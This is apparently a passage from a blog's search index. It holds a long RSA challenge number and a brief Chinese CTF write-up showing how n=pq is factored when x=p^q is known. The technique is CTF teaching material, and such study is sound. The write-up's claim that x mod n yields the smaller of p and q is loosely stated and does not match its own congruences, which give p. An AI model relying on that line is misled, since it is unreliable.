702653636312322482599937959450525244842259599753545255805501178237263561332802681907002753639331538878773156691832740365929574153116471353015014637200983675361708750274430280057629413315151786283020115654627345405695663008957344593287246684036534423012951256658083352088105973312655934959374591149634991269257433623433947482269714744061117449496359311026760713322336506697483137965448367061399093801691443833053682678645521475998410514976000429636255576063942533443369036377338735301635970368219665469555623367278416362144280008006862209266237487191049063724728211553605809894265481365099401896366783650335236725564314579978423261255726042534958180587726974736903215959220838851749334045936702003342671780219594595267120159075237572605778794032527506534443735182410582948104351120238047791713300592968879996428550684041690139795990848962035410372974888891486455571986075454599928302558340835623863865253647569892877610154154239106952590360702284267565995357627384526715091566117194920371048480461052292032269097078040866776612984079900111853072432244559009841472870912366029952867979212110598003727150973098094046272843180774180294346662355739245293094691557588324889206707241448532607480220292392791272681781300425357744049804942843892163217789084998608838120167501369786127463451348966967898417873678380394466043582961131988855796146289696460348181196688873388353666243906643379283033558847957850417144176651665018572681951450044445740349899901948701810742198829122189524190150735977469195040103078369290273679272798616193002092849464644081796411506193390427212520987559403382720541519274528456103269605876115396302269534023077876286688428395542470477354718052487364414832468416455087286761851264942849469453100381009002686231748594351736663993010450890788873406922642962104913792828060230569817373950270524970930741390736662639055056051041285659551711698710815358512293670759508795688444184288045730961157124024433846214547595664276314399942404386485433440748861399168877089011807913776568917716843080643151919571164749380987754280151041126792128029904071295118924876178985751675673343950689370699766180397531514985923815113193606168104902614056000228182322182800276305544605650819147728816492652858952098705588835909839763077400452368354286618060330811399706154938853267897008006414836846381502145911991153316469587166657562417802417919971444491820266760517629518880902356214374474836373114661216490611707920354546624356478946578735290276836573450412600442503160449611915955187126232540763534891103089664162272460385740106080120861798755609838077562366096530309093658157965555296733971823123083677200358224136073394823662282108750636671978661160149640171042251612329725877225057189906880444296709021882208712804886996213870692451549673376520640794757686062822718109657593537693686799157244737242320587039304445137828504926851922668810608556810874560594306307461795794957702753610995005094966950846762222758616764206898575626582522919303283415792217627251400897586907906490422040954247344689551961891590368416176769811382496997426898880280155835516593811097219810747321394477608611965113810111027107259652079753170534225625874518086172530720719038885750236121622850917129152806564168910390293258867055997218533787818900864886887931510140817764654267357019161774249796792384428545290486445485544343121774680056979147009901522715444689408088440527404127826858664494748297922973973296050813172272933709329107874592408516696432907444015852143607649473528139402479872336031748403826877577076898229891098820621640269194756994940722830934431347351872100253380533950089559593708226391006989108790913512381296788182909302755529399980159930264752778171033220559115750660451173270309554655596117775639623342815822756318408556088983672880413484764575106588386228990647360161826971720747672122579304162918619181066398984810610815811845698735043469755098083094644554117183739671250358186879505774558875161140852084499174454853605848623791946006981394203246554365296808769260864076203986359250581230999623579528872418744960740142962911866021259718110804305312663462238559001644362820735441491199456135345813805538023319556300497450456563805323325399260035670271157162107314017582573757959090906252588704374877214204911840600345344037682556356947490806204210554686458135553266125820595044521179789608917667100307780063025926939003405578504536741527865336563406691613065658772058495876350876342806643958895771965466046068761461932507744065312046965273610775677373523849400194074842726591415745310897651471661742936239411187696176994111392132161062586641618800670019846442060438412489051583530996509563421359903610055163595505218159491231123761482819920518791304888433243983462986648918763462489293331114683435273307043898284041993736925506748730808172769038698582725322273246459221412683326960609272178230790951724104843284414456305221123990683128486922068769522441888071632126937019045850407054275418461090658786604683997097403499979968237084857588091743669224590846619679298132424308618987052215403563136613480068268549354870859275764909767418258194372163795827888531885951065494834415930937590216347486843601961957073166011324166971434128009388587505830348253087132069866029918985250807671647896699234719288694238341932308146152898361619009793324356444127453146364003055121917967861186998990713169984417004186007070553262360386800998194371760640051610967372273253380032781846962396846442537306849984403362445104713718861945550520118586965197482159464653099984351450267225944844061173884741975155841701361465918145040197296742292435136950731876535630385214495107048149068049405785403104690357270837053223352086188390880673497879372858639395481292513443432263219164407341480236711529109334164710906972244493885396662593040110827358589081609987462744131883885823979873552667689518178486667092751046398581513931544707398793712466494017021084879442741000053444809326661340862177107440854941463593379151590552074334067274566798369671463007475848645855212968881083817032566989989210778172388139345454181457898606783528559836371684112364570076168091859698231036739432026638851015032990860148341169152881258029479244445311442372446394963122605023447086402718285756139733254547321671143401267960768334863603955407642424921767929351621462610855394268103242420577757522259488606435116943401573264653033437293028782443332664531687682548933834781186125905345929557624923010633949781082900623658721553475084943963040449027603778119195887755038307619198819679778487693057508066338801384461949190967288097626639455604092825407470556588381017404848259661373857603366726074776249925641328987071116553170946299635813610794740616670043592378085442706267584501811257435126579474173039114691324532314117181106328911143351739681416454409893653225309605911244790214593097944039456864039816360421409581886073174866650492794674559021720081416767668011664216577794454343181730021086897929838559485919029188809211134719955311611822843423662055150680985709780539259369289746863866074603478593948074057222956576085049572482245492465635130826312899443583093972654531583008411168352610633126067065731701164841897411007240307550485632211980451831223473136435039131932000388829618651470358415169885355162178315659366557009924120301886010171770498184020556485727757376994020505689242420872503844093561173948214233433228153363876997595476633848591627409784791871619797565170509256411793208778649781872831581569837085014496676075558361460543075015038468729784180115874763888996570904498937278995759173585203551066560346584649487338622101330372076270894573541180776827782758194748074684299333742100482423665976036349139169639406709832047591230100364392104170544300505100363847638003434451796027342301427675113531125424885859975686228573721433138794123753965762146706613645959052793310079943173249272106729111131591862178284016330087921368648352594443425492392170721896846102436658360170051077009646448959635526680471731491273487137122659213653228052477632177203468651088858529508356485812174947706339988406275054443560761607032656909873888410894138566498437989236403990967889722359072214096496648318089455656141920534372984786903271935941441158161995786748534770480965158857025672000276804845458192080447065933975548173948050277052410429325438494728347012262039215073218869449392535162110667100891735484818341523290259313142060194645536272698545506037438214330575393591609351732380277524408624655713239092738580376892931696938019689973040713853628823881556281334647062114793979959309089970348160239704642170111398443379304792604033609996598686066359093731814450444889229583765253522360128167150956027164656130036059848137771284752932223673065307823328228901745543087877697324956797174888855342755383618097853782244086814847671359085072853372457462398252076920618597209505143268798012334028316389183725671641626754257153387461744727228944779700534068385662157841428055064788556298800797061239119792047759319535086462047408076853080841703279965607428387309433899696104637925043442221255742438596856140781070925508725936826646612981756030721988425654078168187564983530581740661348743807804126822186325557256794636010387934442792840788674475429181816078635282920929920104348137614445752401856919053463013713845959380007761937521286473995530923212896738497351324203601969702276219348015119529714143980512067078459491836356058274026278012689193137688181122266467831629149474429696695717799079517555134372736090557121901325935398396123281549632342008556133120687622864887766970907328839205065674065244604505493965590819914129908431530127946933830835789998100269384553589767159344335555396348628061365022095998693506831439058391354778061432160955199362805040763789053742538380009628476412429859033120383042666882225101132953582420782772102659581806699625118973744046780316753708789838095675552493828213447581380706264248793958972090935537954782169336354178001039571981383397024739209348636916401237962210125894882928638539130060046521349148812988786457788698826605906312756446244998155437421023529019998618882033158057125297465067875915386794248617277745946424140510838092499924020448834141809938813195238772926270706517856684229948883656684187529852805535554777201618122288685225592739159335408382794436166289979022134518970857176412576205965482958098164521082389636142610402005864153927278250127974459178889018543882343869055775254769240157633641100226868589162352145631993634422623708887497319059955185604106132539503745314277083892311105070917340105989999761520182989401242724641698051839995540555220935187900489527906052819410133919301637191823250947824391214564201407302998313706414606634610317435454981039797917424507181709786711456980170768139849993023511859349280861331109610063684101386965865933045477066150755606824733080179581079686407533744859651557264909517416699330409527764513263863584046216741898009581777162672255979396205737268771828568564815945499687924217969302747370310831361141510990038410565936214702679642072364049115643028119927647625316658782825892024463522531777728342097769482408548663277685673708377770493439486992101468783561479088100575303847188988690348855502407332019018848072576245255327103124648129393429701862312812708543482791900335855854520822053289283765362663418178567511551743857697104898867148980400157200815028960094118515201418812335241884200310313218030322972646710016883794752936464020661880024782458954608840826033704986400366770393424336771021518079801736492560009606481195447685028155304883906538861017961296378723131517037056014928544452724455376765422033312004191330155120062324380114443446799317915820009583006167277168131921863085901790445250887034159097423251584736874126479727001067782630560466742867398275203864224930771620349073924851323733715475533670695201952284768816264822688632206773660881814829922862936251410039830134467225203838975883018132218571139179075518575903428990400336304617753628345861680797984023574476892178521686781464216943900655967012766391086512854607084191520120805450778980342474480421439380610940254217660741087289751649075651838690238185779540909674932872203464913142868266524644501280090103775338050070178138698582675807570810301319085823090758044522241180062031664594598411835842592402610027168498740998256015414006457306183393768152510673280201562626417306953711535216307606941856627240390837865826398626397175527801868337120039584605880010822440039011886184266749938136472786653229275430387970522445120013628851038559496893473723297312242843218904965716007446173500747607838287324255477557485974145618949051870347827657462967806380732331675446321168294571173149369202739789153155358692101832421101196321265396514962704131051372153629999109972367334667271308734663963106971032829963211485359172947933839476005170088995432766597934313266533660687358548075738713936040955383256321195606300258838112221522306722875744768011009154196600905963429576761850037459233597209842682826216788877881206752725681735088400816166126301552990850814274360474644232127177818057212446486323658455191588996007316304066241110970953720420699311080822430425669537355650649526888249835816939391527501438324357556789132789257954296982749595830338659048591178046874257623805553693298053505109291990948928773993424117138639617928566666131365861238863846259972780277093594947645355734493283399010494799343443091482428221314604487270348584186357128480934133510183226845010755067603761541546852287460700077570899789937387326771949508495519880801946736724974807768623264052910304724083154534013196685458721133135328272710371178099006656554387749453910144045821486466590046076347256462324812150673325225775352445735534346936484336350646285035231429438801391354662120635467304193219178252444488339436926268412930589364755871888030968349346311875870909022927821457123024660321353685043687686804503339423449923012205015155915969741958722670347839459790634324737209203812632764232710002645704924871669774217476484043741792161772519424884311338280520798830176687785419485313151166457459591377753942282410791468002254814232141820833005096487598615836419790937376024022639286138986507071085288164508918324510648584954410080324979723573294995626122468233996871411120737138104924153570992860131659197265769693479531437263851886945099681760295771365699322479769017142219025037749399373623747244326958448796911041346679707116981503941566104470956330816248613575381387692267180972224422006587241561335143551182112131631190914194690292419754067694340669682001691356479733684998235478187917453180019836259699511214654723591084045702025637077937341612868102380339279717852813311108876371944025940656995016462548321330142463168629504666734110007926993373300762261504797511997010075791452251401146254403015441990307492216639861701125777119249044677296750148133065381261602634513619150057356795744204413237735613066936134590440501197895584519616465531268929558895659013910212695328459269534213339695484756354736360405079845200900197204231008595160349501439427050414398110259799382259212360054249212880085139199313256692502983075202989396185974698860914464223597871296173578664355678979050998403808978199395460967656380818265970602638679405371138437194284113794793648512701019092190378534346719364565755381224959774977938596108339937684130806895331507935865377879269610809295363068246052484546232279885492348573863514462613129803114094092580458186540975024431559445880080189702522510932896834715666044169028250933706776764610003286504979018581410800134214993929313389505896485358851784844989096617375919256898666894376209247978647182291124357739038291484942377841636017697099087547677699016605033066320233301354563520145892425404801954634685188435178083710649723260072487357905379318298058394226800305495283878030275065883130906245778581379074563722022292992911372304103181552006607728006609486880604929074428516050566186343660475571874811385901909616295761227825315735915818168424205495416921257312363423568044718076240212171629416575657200967807882521462617036252180587686818657590357604219148371262844255387095268332605578732601590756197954338168695188892120339972129368827896446185505690677557969739729601665531994964572007495251862043009977851414207979488834131820677448920603727135231653757324446997123233899282878340460732847100615797740086683506511539031535809471200426633819249032951232587858461991477096853680697680928934856498314661584350571470888249149938464886337315601022960136710792859169421820293299664158318650667122010193848515093416498072089206709097518830050550789631540062410271483185107379810727786837196835508966590749452224596106055466051887128038409477845597594537978089535945024957533339007593483289027944533082001137262535761045272143206528234933394554199374642226792102613916275586144972487226057537483878683018464240276181143834915486219235865433188650127608475459804303922288911171768488085507972151858535939548089977499527811540655920792345697329208680131686417308071441809981903848496861021878629442311607227096174600411944042922482559194224946413657997437121811186517817060710506063448088487182416924426661708305151346413647227221135600787310746021968192973928994542920737379007902816373668085573416741228974144229392786428174696764939598724671910803127415356678577480058054491416045793434299368872740902815276672560507599434324791557928131778263779795319538483667443641888301759661848288977756165954177866905027723872731553133095256653442994299990290586134997592824162539192882303253636962095133259672264096939987887126084330775542969577676472144685288668866894997463770125617669784815397409485466166028852717064191691895518079881333021361377937185154100300046698393124998149617050742516978927560307211145364327866151342222410297308056966736200186131126956256632802532363567589161217540076876359772481606403542571979795779300763603748415421340663087422285054656711776210764938937611356064541366661366937629733573697599610625624846451183933530409881542160757101489657293191525903687620717910312783617196976447781986184943191396816698441162573473154651937797389426300148685725350474251582190006037788868489622290245826275993015650236703333328076823012145294165325479796747808075273499273162870576137693120454892005627635646447654412623489504312806480511894476503277592089414655248844820250227141216253462219991963313345106914384788950499456779871710047023897572645498723685103770764859766800599153839354558821645464652712714268318155008634216005020510945473535942212845865688461177290814351938743870865804266180515548576356684413038095253060910713696017899167065998204482729586482026179692410677750985210765710686583617606809338661804243197351606178165870073620295074192350611458369786709665303431082474072067820753826861660639848144737813642339205650656969266307159440447588204590231954650419089789666955128685929512529583398633405008589489418280819058984415577106414788912996116373136211755678292801378801340811594061394217717322153321300111867803645542853370353310622263573543247527993740640223885972155936781440960399595829124727728190336990164988931491309433567847486126013106944771383244153870483998619748931442917016524295831227621802186574847239598029138867845142535344775939286451256034481554132563458942584819863821574203545711286730164070420334105940482348324081943063397137668834276726102588942540563876114252627418197686957111576691468942596963008025144066787044091536208973234018611559462393576132849129391491697110002863882928595939030882097300951143497589191674783968097596831358693749956152565922183591084792072401610311363213681857276127121316390424690149994223565002683005645334453604514579895481999368620492780380521276091849086896866588515911320611519075109595985897356848219379485934099647754978599328549051722757463972247473399847357541414988402703887043993705655880218276564035660957576951718260574730602786201676554560126663434642983693641363012207812127294759882736620616666037223948596200912109902236280797755613274858651000847283184950569379282687783347394749976795962623591181021437407302146171491648395717347513641909848042947931543211878002853344028599056906631093382619162256559560169677096788959115368768459170762827028075062985119420960965635762287017471701405250242002960242564988908913439117654803776103961129967031066908652568618932742865392287029794491381233804601811318145023994650851874179284988594220405175178259482541386679925212172666559188877809984377733531564395850102858415712768657852255551397124148993325690749634327812032454612192724596078926288435470736155871175838696966732209971970643851103150105716869643193605456553616409164539583410409798046906111665575570094237128790143864220057202482361282468135304634647629434940142174105996055076632584425816376737725977129122007232464201844436442778844521341196287608219216198579988961999002650560869840716115889482675796971049485127892063774052027655317522342103545867609659569137925623364364833824821260634064481325663111562238187527482302487239517630462378138543426327510002956069266713967451932154094745689502842042449065327109024336129282924417277416575460234238370990006855663518869445631492863662500723121641306673577011569128355330767499874830492105560610572868822286226905636991604360602554942242431560240356705685514088827916305426152479198228419683128819128076757795658189171599547186911673269986512621904355777155951095753647066531070896434801600969890113949246705138488793676906894002469325301976072664813806620558303381712045437099079397129410274919288034732300282382046147519327862646798653107698518756005879697489049293471013606160468866602495847667063616704941476068914549675634922450327620143944414101960138400780202280278200612386730049474457903374447854268463502065885333660852594856379424075409012633879166509588188311798534453951910051668304073022028907853535174859848662650178079578432771431860571303090318663705721631294243105873590155501340189261091671691041691632825331366468008277134714450119828291844229468177426743315378059297149954050803024861185572742116011203866757441889429656118681088451396912832963222686497043984979738470791245779355346809328522092858825828884230750388287107538734753131094715799176790236879918479612830315957866864352214513704155074007461673769628295801780427545444615952889618396645017584920456488222484453650513162201153975317990332691958599408658853745189389899013234699330014285984537801302128652146309699332936164469432439979904684440730553041292842326650534450646850308541872904106309213711230617076979371336768236537756312033063221044762050778903884071683309935925524243096979602095739673810738303655792659970328435519570538705953684614498161090732454247621362119575890707861597020576949622064995871221329476733666617582113646107648395269077303734328212950614232279906160126084218854810271311857784515374483987130673211099468119815762076050487067357204417744458936329260209417032090045318393705039933356611293980828414836678436378118354675831938968079068242653109490295687746382460263906995997839349491480797434900132999769762764490695652707537842980957402158969902422443613556672280664496164772814728350030606863945148961185883430207137839424480652492036407993343192939614517906442009504775807560022668363511587329941676596583935041273205047505106270420169049606591313718401298585791995100788553597262817170499992219426949992020107638302089399873202981515206399776080829431156164226092677364048321396018425718931548981183876669256258420828072405950312806210769094741837760017475666626347851423087938247057921047683672143221469877694952874603497145887330875701315251147155644193631063566582158819996505632260149571096620743591483768273611075234798199501448447686223701459906171259932685650403268787472923930063511260502987936320187515175883525199482124899291576452474786181329464194035885820805401466790454009864183963415387381430808127854081298114347327226936849216187246246863928992990965893848414894960689371904036181795684571113160650448674917729722757550206838539299577264716152014945368033046261697095802997112874508008702034268343985706233786153840389600187397180407089545134035899467433590988052483128853082950573420818249321105658530351257607201068814231218808699591623988106311759027837400928042270186724414742843708470726420862203021214671938438114592705334633196990455671205366547016472875824643260360791669172838741839406640839830795921345076120922419591373419724223374977921914423409914699156646895471639918134700603947203567278241047172665083651068057396266557268346582120855365380615223194706955077166608919878811202378959397046742824072819074353898776604505802734456642088796341547821706124374129054286860602292926785655763085277452840833019518084851160249101249754655184412092412944038904026905440527307473539784989731335910346010013160493633254805002644292419760678372088204690753465258218166188197033077358637805264267643075876437500878291977909236576396471924514168253893502095606168139071855514978799444774485090300586762002961439138822591071469735924774372760318322052217275297279028140944241628586752231158338326839011402398742797473023943340061080503350616593075932740917719242269208060883358367234710927634709197617295803637279305540447686419663519135176521145756127052330261785700805500268268525179507401712031620792185794898040468920532855557814938305230235429474096626865460538814937313126490427636443303026655688525982098681724627166550265170402676887058037587293587276679359000987080672916420978762703241102838363307281675270078847335113537988678258360649075864452493954007462311516694539072193434577353462442527944806089021301659824783214168665739477988670008842575177878742662500736118191766592893394072879071759739839669822194703467719337955374755332127196126275357260069652804522669895047781474464849922770181184173731857126242861185097942983207239990893313379696329324623316575428732353331808908496869014188805570090609442725281739414349299477578405517650868537946508166151306016771189275712903280325079513499710718802682286552813301544196375792478101731745421663320573161399140397187122174357865537448825484070719391036749075513967238530315297428479635644854428893205667268560083068213835823374591596674248534334084310245378733766461619146076504354166712283214215363505963778165037811077294854566062619843546130343562942436274837513298030961172356295660337620299694592940175552680074023488743255507725395310681117105409200960826525561502586541177024051054017612460345403646638841239659027488058755033609186390057988644570031304418644446603024519899602114402579913661538665469312360891058451481275875047720766945521889697526299213448400595211690294800796546209100649144845878704574226036829910941440808527669633672591964387297744325395781132185266680734754766654983814258576413564433792537039656357478122929647366304998630561249418693457267796420623400499406614419912820185059015002838854808828000777014924405434787644325266357920248717625039074182338420850177041305448392887350520658745748350922881353612044988928746097230317321213004363028121759145590766761759592778890304087522183845111430582653697528618640745139233501585351213838801384721288617088657489424090202345498510843362607869691411346622972643259468251443596759093346708700828419319612746174463904475305040278983676871661153981107063038257235520488002307919532683921203903437183693839257790339178652231846758946655348143631268470663902150218267777668532118228644482495912919301155054447265587311476161672801355353709885721462079389637261399410786376651477530851912781542259428814320225660447619160021406724245500054409390577582661000863676350769287422479962464219810506619098191794445554924709670359538104071396191228398098840376627716725565692999310716240246707783561604269908682826140985871975530544581666093171039124566740173363614372014828687116645558678951667725731035613352114477287890652246599419620404321767739738665928709826162832876901238645399526971160422864941372384671110287909089748849821533165295130114952423595360472768442329088968009185873386009356707755687595764900777286298989097357948882439136360734786656689117100225138155687242513440408427504151356680182521089194586804502957035801292021775648150079146181447202354120355511267434127454449055230514529907596163502161108076962416328214437114586565291160784322615747590462703746687977863664559274315110701555742517401039892930981166350852799300446746281184364740649267485077823917940730513843312621273845073753844062494482559073084032097047925415355959266303489147853106736403707125284173255836299570663729258999259587910081822180262232602793096284270735024249567780755410560918655642342967745531034527963385407391259961810607822214713853769074712584451593281173026853937683945311175968436046077671952765741443908495102503678345510888138330848373774944237143014557496297571663450853500224349922839167848703224466450778009405313903938084802831899445149738759029702512658661115753222278021802724618473486503040234319682234955365281745662956381868404605315647728214938043963144105305831536264414450131606959964138031089426144746858377603943222533979992391069853066688249351582622187297264468976451644575444401113347441602147539575767856925670002985102698895719881172499483856818914781612271836330385163377159243010399114827084722312411920492718647261019233772923471692799940520266368665083300307274283478917521723730843866434025843096160473010739847815049390777568495945146120619704431367320828588905408886965038810196043496438515617514888722602543614094865575175837135612729255574032178763193510477717967599717173726759127345611404141318422142730022877473510087912428961248081640887225965077507437625494989907961536084620901845018949196568555246935797164852188978130343585130606457707457959658033589226575895986835064829414020072375231711864058735626168582134244970613176802161764558451060236988270341808771906087618060249773556888757120729988889412393815356400977782849305366825903827520364719430743308883756743809914641555200231894700990035337345025695763558812882964139302941451860276500572818495864578405371996138355157151610743896848580286255882571507753417992254372691167069855454376350616070969911648247388643381696779531999294907887516246232303935268900048492298188736908141353767994705914096056093920490571793173459222918353789606754798488553354398628443764470432332188932351109666599699609649359112785366442406006272071412743322282571742463916499524350275361666043353654517523167820616982849124652734252807606953185642454010313041281909692736842087823215790345233526613185811360788718015257387182992281204059461733027701105327248837949217796661672154117719074781783073297832882397922980132070159927470651998440850289610174262237493428797708851731014408706410072363303902463044423510393237053655901113872731986299389017415390314449954138359187044564046535653243714641682421224191138478978215023022090868491774670697341043665768270419237091672504116300910812982810567417279310126866936652195726371946039566797187555292774469997332176780312307921745907641108540131845117987802792168132859215341100188106649726752255015197539993368331272837895134801052432000673753562507867741290159277765654546381752691532843674507699103525866169934800111569715929882425431323970676774335765864647425528914753424134708166335848458278738779435771806014193636429909499585566790402625288788648000687438730569961246100246900417119882658305396817930366236478577412152419921594785432736283153574874978009910072210120417734231712506388591266766719659172257437075217409645917364926031952262719899948773923708573879850579324815668526699484736522771744672635799763852541264427529276961610244624478084093194535565508624741119974991400805535079741569016353282864927099023004495460957262155721588892499813152605627476983875917322111039720391778954552012055972078890338179336616505372619360404308127662659488893508915117407637911666107425543936578878089746389465837838549865605177532272556684693205898523219269758853247693722753727328208052164598930000948971546135019323396548906331966268929219199796955126525260468593680379379750749532517280265695853759759266005894853568249420161662680651811338651120676594243248130659622497308301443478641755711632722277513246278627151712983448598214529684901049075113799989648562160472115227252550994754999104413781540365025791677123336700637672194477900717667152643653486214374756541146718912381628582210963208228168658927257620931336768808581167867573189161468463915664675361774228847225507732600965449125373994292804270259048222209099629861322406002983908731036254129423381559496462771502484388928722171915293824700273532654667216051672042157496799746144318073522726621151986981055453121926226402010362092899544243974951599797255574354883122841954856978436581642481607684319504589144074286633597465577490409242012351651788053197805284569489222426505602874816320088223484987312095175583913338998455709010993720821960717697022042674382932004011456752309957835995797776032052983823533965644099341858268908425665839109015941008302541198057568304361930228431674851081144329348030877597033821872877930129636770762255810418241409643707272099615756387286342938128172656810262245004226725863941783589013032667699233449268988758873965305914086512922527761653479452692231581770686415874859277331805713719474494090919671117526832021829649035713978382852685889244610265555729254623843007406177367011523164553148452034530032902574992976721221236808143187368247704170664506253369205136842518470901466734362906428517649716350254268140562697409405251991104281733336526245388550547241131203315374884263519841183216647624036099617139028277905234018418823828276831942889744406821561947982196603323559633446453956850922758195642236463397320562648005813532793223670946624044110621061808330731852369460935615947189914786906593842052412064898369928701191924185368594890848357272196736408416198866935530676581841086095132876256057192756700230183834243369252526020053703494911461499468126775048000508259040335852966509411915944136557666292997983916766945983347144831803175903317303942265110029938661894706485103435029756907804936402181291544881006935500972951575534346052677376138113017873395861891257117675496014998158216453575094983247346618152463838902180839504252205646657637361521989852689937787801141450824336116207962266351923992817891672338465092695060457502362316857208790895197750608313091229154184545808993600602046933908962330396434570856692172055090176224932682351158572113666114012857590471058308027346029460897339196032090423508979270275693832089088511710539411703343963970070709422968275830308606189885466491014119858042483068339441507214477335446643987060682566748780898489852452362766824886414121810599315622228494359363009855467762411090465221155379737528159701475330156681104779014811492543167800651711696212683528469247219317093177535485856636179310253575614059652655045855936204834589590846563254485621493309813979711515704726767192464674511777454787334673539105404668996694007463791772668887735952747341331402818442981212562419152482313306943118282654373690851168833447014183425513963510500227422494066639430284454232356004817128966594972893318762440862555322466354037988097530833361296317844220845901668287042985735044828426830827640535349962501599524038853780063734853009184079971247721175826590249383086471521829093582937637094348397228975098445592509786592550725471062089788352742444341180695521180380725549852573253737138145168588465674367076107221137415239137261441455655669832190846056054582336085372135510175412550783077444161781017848944695487554266396393430615463152693266147525026894581421690869894280241282220472548798069399372842426333767439509104505835584910165482563090704091103460950854346327751539261872917383637754850000460870779061198467852569092355328178092619457671812139077064332792828324168935686370750996237904401948957132150708636385050378125007040712546202582315223639980101939984410837909910137483002088573971201857775695238387514061745812738026052129755182372877517101084117492790006236526968847112726043501378474849145726763576065873186356852412081464736706892279938643363353748323064764862037946738526119459926753330625201076001321242272843937683896853743940300833627303160365928360085546331892016039813968765131853894641136846947754508128361128998800266930046986789232276391957002802228447101191154686396363674587535311778733510558485250461959535789860572725226950778711115631545149838765460480602093362737835514118370528557481970350225684026894323655678491105196233728727682138164376193232465144451559474402379107002183590432006389453594458636934266084643307997819628381146024494240417080501455922446984650134231017928437894343899938602901817846117099497471881837971377825986903371950223369122420070104003201479180578880445630153880251457787030069918520234343328448919864637350011303616868184294110073324059783498312673450205895247399714083274711914708729885607283101997946553201925484476970700060186723708089615438867988125556526154527339918695085190560765668311602340704570892634599426065333104911623057584281088528215024488016084295982051708974547522382766584184307419846526615563129996384500489961910866631674721026057177065261250252165498000398274802900971372988832776362613887197465251887644076537038645597979739560114384145090365710942666938073575164693377742300049280927320134535188666583970656211667345006955561246812658665357833430724683899993281056778567081455389572534246016599036744084400197227949451797980375433146526656150976430299528725603595273119623829702065424336986292485823642612145592273029824985475501398284096225195198782088414076783151191457291097389676364004620163660101078222661400829828137497769741639341236754400945763457959346308760187713686109306130694644498942527469276072587399747398739176719721686271982654343742004616807765320704578475833044200756422225975553791935378941865040623327738065369253234245290970922552501011801959413223259806079009991732933956169546995632866148237241827560928611389842654016571892406680646512946429331961084006822869805859864178288873192701336559102956787634415354808108822064450726834928713929987575108550328098049003811631938161331885118546578814262228958294819218719379866021696844266485595495728015777282053286364810571435746490751541455183553759169563498816679545343881059207339145453590949692465046244979331842638770746434239885298096076938983015417639737687153642570423768757141146167164659241633538794765008544614133165025998416257204481603928476146588109387664636290644283182695875350576739454683603084784489613101740217290996931046383493710490290467659148141588890239857564838426897296241408567656290545828621063123110271315578207150676807183852181179300585231675796130524379316475272744233558363491097356925099674115348459669539397620139978580867816482678565968559768000442339454705810559177995573080917750142460440172786843131975175020640680569698418724843064200188801836374497362115933025051064377448546907944559113056771760610535814872039131682713582668327289771163024382074905023931246912432353508800768164935780409447136494865735979303815477586276665910556876258600118871646094701238086598304096102926445319585256966866256886890764452674570723411610727578747176871028485107301875186656495084475081190871750446408981641107138526462002002356246382049278330800699557475580905442068072929410016340838394931375682195582228928095674562521319372013806788836264631996852752676659549756883135012508994738284323261622281736641386690719749652839318089378835845694124499324717724974114021440289637058657977117311390020725404072959909403504510906887916106442355463905714683035878405023541329364049782096022624761060286610407849105573406964336053236414733257011431607145369453417465686874370972356521107111241307491522934448029314702034572661907388110840011071696608300800578709002783880884230109733294934322338402127305983428098437486685469309860261529524449640283588051909300894914189579437874118279700178170976116986480759431313380944099750305372482168300600054287925152698205664721287369377479208597870934721802546074412120072162856461034967793741024350313087278146229831209493119626858124866414735315665778523580171302939846418214104566707601846722661308219313542590951438254879498022212476797462967855420298541914211720842645541680102110529647970340185514646960060815710938174551791584031535010723757967345959468842929863773229474011077730894291307577251841449733659786623817741615116569316811695050267881262105301606221038809979409767581887994970732554959492392437885944572642610108538734812400759116705498869557016032312571333535671929290201941664008530625329010458120377338659760462098548048333994709846923344891169046536103128744521576093965029796112085198923593498854665435994208648670696787430887854573672664950012832027338359011443006383138652949786132226014276481597029743298546828960799799681940061925458438194732476172208965798839245067131319528715528396804640689032408907958556949119580440703312667227415471399233127944549405267529479306717413265004746549272005228733504260142930009709597416269634389623545490415492155272785460876682214029832094718288509486854564742732061327388377557285931970722074636133546022319422187123903434648433148756764913343670250790489556572658574571016296053742375544113211765701351802464906558159979613771676751499316154543756084390117683123493924594139984831518563345370614755895397980267449484582086777242184115503380842389261654134348332183721747487540826949430907440132273887225764222629629575033498045766079321016582553642565749965521702350686549275512604731979531267387011326191533874422307173505579550851455365631352938474332071345080156146528232598373365151032766258098028171772168329593424195114045813204558514110058636047758056003688994099609033236891248554225920552767179184712220951912457222056785685150260405262788404489250304048944291913438021827977241645663352567716195723490146132257988183976951982070585743036406404439609507005960639011043146784362525763628650559494717019176862146735603798787020617222012075764858180700979271960714728877144578603364012922783782925114416160619584040137621714583176971547534544323302975799933062509598826390142694556371302103588574021425599391349179099069106123405465828569661885572836536836907814081472171535766506991627993903266670399712276843394449067023394397289888309565129573028169780874214431963613533774068231167723896507750892008995171616780044389954003519505705063061809502056031141469812222946215894557591512715260079244121163601607626691594027302308035684890625165550995755045542170242257997</span></span><br></pre></td></tr></table></figure>

<p>已知<br>$$<br>\begin{align}<br>n=pq\\<br>x=p^q<br>\end{align}<br>$$<br>这里我们直接<br>$$<br>x\equiv_np^q\ (mod\ n)<br>$$<br>根据那（nèi）招，得到$x\equiv_np^q\ (mod\ p)$，$x\equiv_np^q\ (mod\ q)$</p>
<p>根据费马小，简单来说就是x模n，得到的就是p和q中较小的那个，那n被分解了，还有什么好说的呢</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>RSA</category>
      </categories>
  </entry>
</search>
